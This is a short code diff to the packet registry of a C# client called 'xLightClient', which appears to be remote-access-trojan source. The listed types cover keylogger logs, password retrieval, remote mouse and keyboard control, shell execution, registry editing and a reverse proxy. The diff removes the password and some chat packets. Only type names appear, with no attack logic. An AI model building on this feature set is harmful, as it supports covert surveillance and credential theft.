@@ -29,7 +29,6 @@ namespace xLightClient.Core.Packets
                 typeof (Packets.ServerPackets.DoMouseEvent),
                 typeof (Packets.ServerPackets.DoKeyboardEvent),
                 typeof (Packets.ServerPackets.GetSystemInfo),
-                typeof (Packets.ServerPackets.DoVisitWebsite),
                 typeof (Packets.ServerPackets.DoShowMessageBox),
                 typeof (Packets.ServerPackets.DoClientUpdate),
                 typeof (Packets.ServerPackets.GetMonitors),
@@ -45,7 +44,6 @@ namespace xLightClient.Core.Packets
                 typeof (Packets.ServerPackets.DoDownloadFileCancel),
                 typeof (Packets.ServerPackets.GetKeyloggerLogs),
                 typeof (Packets.ServerPackets.DoUploadFile),
-                typeof (Packets.ServerPackets.GetPasswords),
                 typeof (Packets.ServerPackets.DoLoadRegistryKey),
                 typeof (Packets.ServerPackets.DoCreateRegistryKey),
                 typeof (Packets.ServerPackets.DoDeleteRegistryKey),
@@ -73,7 +71,6 @@ namespace xLightClient.Core.Packets
                 typeof (Packets.ClientPackets.DoShellExecuteResponse),
                 typeof (Packets.ClientPackets.GetStartupItemsResponse),
                 typeof (Packets.ClientPackets.GetKeyloggerLogsResponse),
-                typeof (Packets.ClientPackets.GetPasswordsResponse),
                 typeof (Packets.ClientPackets.GetRegistryKeysResponse),
                 typeof (Packets.ClientPackets.GetCreateRegistryKeyResponse),
                 typeof (Packets.ClientPackets.GetDeleteRegistryKeyResponse),
@@ -86,14 +83,7 @@ namespace xLightClient.Core.Packets
                 typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (ReverseProxy.Packets.ReverseProxyData),
                 typeof (ReverseProxy.Packets.ReverseProxyDisconnect),
-                typeof (Packets.ClientPackets.GetConnectionsResponse),
-                //Scottie Added
-                typeof (Packets.ClientPackets.GetMessageResponse),
-                typeof (Packets.ServerPackets.GetMessage),
-                typeof (Packets.ClientPackets.GetStopChatAgent),
-                typeof (Packets.ServerPackets.DoStartChat),
-                typeof (Packets.ServerPackets.GetStopChatAgent)
-
+                typeof (Packets.ClientPackets.GetConnectionsResponse)
             };
         }
     }
